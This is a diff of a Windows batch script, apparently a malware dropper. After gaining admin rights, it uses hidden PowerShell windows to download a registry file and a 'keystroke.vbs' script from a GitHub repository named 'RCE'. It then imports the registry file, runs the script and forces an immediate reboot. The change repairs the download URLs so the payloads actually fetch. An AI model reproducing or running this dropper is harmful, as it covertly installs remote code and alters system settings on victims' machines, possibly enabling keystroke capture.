@@ -25,8 +25,8 @@ if '%errorlevel%' NEQ '0' (
 :gotAdmin
     pushd "%CD%"
     CD /D "%~dp0"
-powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://github.com/bruning-frighting/RCE/blob/main/dis.reg' -OutFile 'dis.reg'"
+powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/bruning-frighting/RCE/refs/heads/main/dis.reg' -OutFile 'dis.reg'"
 reg import dis.reg
-powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://github.com/bruning-frighting/RCE/blob/main/keystroke.vbs' -OutFile 'keystroke.vbs'"
+powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/bruning-frighting/RCE/refs/heads/main/keystroke.vbs' -OutFile 'keystroke.vbs'"
 powershell wscript.exe .\keystroke.vbs
 shutdown /r /t 0
